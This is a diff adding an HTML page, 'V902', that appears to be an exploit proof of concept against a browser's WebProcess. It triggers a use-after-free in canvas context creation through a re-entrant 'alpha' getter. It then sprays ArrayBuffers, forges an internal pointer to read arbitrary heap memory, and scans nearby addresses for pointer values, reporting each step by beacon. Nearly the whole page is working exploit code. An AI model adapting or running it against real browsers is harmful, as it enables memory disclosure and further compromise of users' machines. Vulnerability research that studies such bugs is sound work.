@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V902</title></head>
+<body><pre id="out">V902 — heap-calibrated forged stateStack scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V902-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/*
+ * V902: v650's forge with targets calibrated to the WebProcess heap region
+ * measured on 14.10 (docs/FONTFACE_RECLAIM_LEAK_14_10.md):
+ *   heap pointers 0x000010008d8920, 0x00001000e66810, 0x00001000ed1a20
+ *   -> region base 0x0000001000000000, offsets 8MB..245MB.
+ * v650's list never enters this region, so its crashes say nothing.
+ *
+ * Phase A: one forged read per WebProcess over the calibrated list.
+ * Phase B (drill): after a HIT, keep the process alive and read +-1MB around
+ *   the hit in 64KB steps with fresh UAF cycles, looking for pointer-shaped
+ *   qwords (0x000010xxxxxxxxxx / 0x000001xxxxxxxxxx).
+ * Read address is TARGET+48 (stateStack slot +0x30 per v650).
+ * Add ?r=1 to the page URL to reset the attempt counter.
+ */
+
+var HEAP_HI = 0x00000010;   /* high 32 bits of the 14.10 WebProcess heap */
+var COARSE_STEP = 0x400000; /* 4MB */
+var COARSE_MAX  = 0x10000000; /* 256MB */
+var TARGETS = [];
+for (var off = 0; off <= COARSE_MAX; off += COARSE_STEP) {
+  TARGETS.push([HEAP_HI, off, 'heap+' + (off/1024/1024) + 'M']);
+}
+/* a few probes of the alternate low region in case 14.22 moved the heap */
+[[0x00000001,0x00800000,'alt-1G+8M'],[0x00000001,0x01000000,'alt-1G+16M'],
+ [0x00000001,0x04000000,'alt-1G+64M'],[0x00000002,0x00000000,'alt-2G'],
+ [0x00000004,0x00000000,'alt-4G'],[0x00000008,0x00000000,'alt-8G'],
+ [0x00000008,0x40000000,'alt-8.25G']].forEach(function(t){TARGETS.push(t);});
+
+var MAX_ATTEMPTS = TARGETS.length;
+var attempt = 0;
+try {
+  if (location.search.indexOf('r=1') >= 0) localStorage.setItem('v902_attempt','0');
+  attempt = parseInt(localStorage.getItem('v902_attempt')) || 0;
+} catch(e) {}
+
+function uafCycle() {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  var bmrCtx = canvas.getContext('bitmaprenderer', uafOpts);
+  if (!innerCtx) return null;
+  for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+  var abs = [], dvs = [];
+  for (var s = 0; s < 200; s++) {
+    var ab = new ArrayBuffer(768);
+    abs.push(ab);
+    dvs.push(new DataView(ab));
+  }
+  return { inner: innerCtx, dvs: dvs, abs: abs };
+}
+
+function forgeAndRead(cycle, tgtHi, tgtLo) {
+  for (var w = 0; w < cycle.dvs.length; w++) {
+    var dv = cycle.dvs[w];
+    dv.setUint32(112, tgtLo, true);
+    dv.setUint32(116, tgtHi, true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+  }
+  var leaked = cycle.inner.lineWidth;
+  cycle.inner = null;
+  for (var c = 0; c < cycle.dvs.length; c++) {
+    cycle.dvs[c].setFloat64(112, 0, true);
+    cycle.dvs[c].setUint32(120, 0, true);
+    cycle.dvs[c].setUint32(124, 0, true);
+  }
+  return leaked;
+}
+
+function looksLikePtr(v) {
+  _f64[0] = v;
+  var hi = _u32[1], lo = _u32[0];
+  return (hi >= 0x00000001 && hi <= 0x00007FFF) && (lo !== 0 || hi > 0x10);
+}
+
+bk('BOOT', 'attempt=' + attempt + '/' + MAX_ATTEMPTS);
+if (attempt >= MAX_ATTEMPTS) {
+  bk('EXHAUSTED', 'all-' + MAX_ATTEMPTS + '-crashed');
+  say('Exhausted');
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x' + ('00000000' + tgtHi.toString(16)).slice(-8) + ('00000000' + tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n=' + attempt + '|addr=' + tgtHex + '|' + tgtDesc);
+  try { localStorage.setItem('v902_attempt', String(attempt + 1)); } catch(e) {}
+
+  var cycle = uafCycle();
+  if (!cycle) { bk('FAIL', 'no-uaf'); say('UAF failed'); }
+  else {
+    bk('SPRAY', 'n=200|tgt=' + tgtHex);
+    var leaked = forgeAndRead(cycle, tgtHi, tgtLo);
+    var leakedHex = f2h(leaked);
+    bk('HIT', 'addr=' + tgtHex + '|lw=' + leaked + '|hex=' + leakedHex);
+    say('HIT ' + tgtHex + ' -> ' + leakedHex);
+
+    /* Phase B: drill around the hit in the same WebProcess */
+    var drill = 0, ptrs = [];
+    for (var d = -16; d <= 16 && drill < 40; d++) {
+      if (d === 0) continue;
+      var off2 = tgtLo + d * 0x10000;
+      if (off2 < 0) continue;
+      var c2 = uafCycle();
+      if (!c2) break;
+      drill++;
+      try {
+        var v2 = forgeAndRead(c2, tgtHi, off2);
+        var h2 = f2h(v2);
+        var isPtr = looksLikePtr(v2);
+        if (isPtr) ptrs.push('0x' + ('00000000' + tgtHi.toString(16)).slice(-8) + ('00000000' + off2.toString(16)).slice(-8) + '=' + h2);
+        bk(isPtr ? 'PTR' : 'DRILL', 'addr+' + (d*64) + 'K=' + h2);
+      } catch (e) { bk('DRILL-ERR', e.name); break; }
+    }
+    bk('DONE', 'attempt=' + attempt + '|drill=' + drill + (ptrs.length ? '|ptrs=' + ptrs.slice(0,8).join(',') : ''));
+    try { localStorage.setItem('v902_attempt', String(MAX_ATTEMPTS + 1)); localStorage.setItem('v902_hit', tgtHex + '|' + leakedHex); } catch(e) {}
+  }
+}
+</script></body></html>
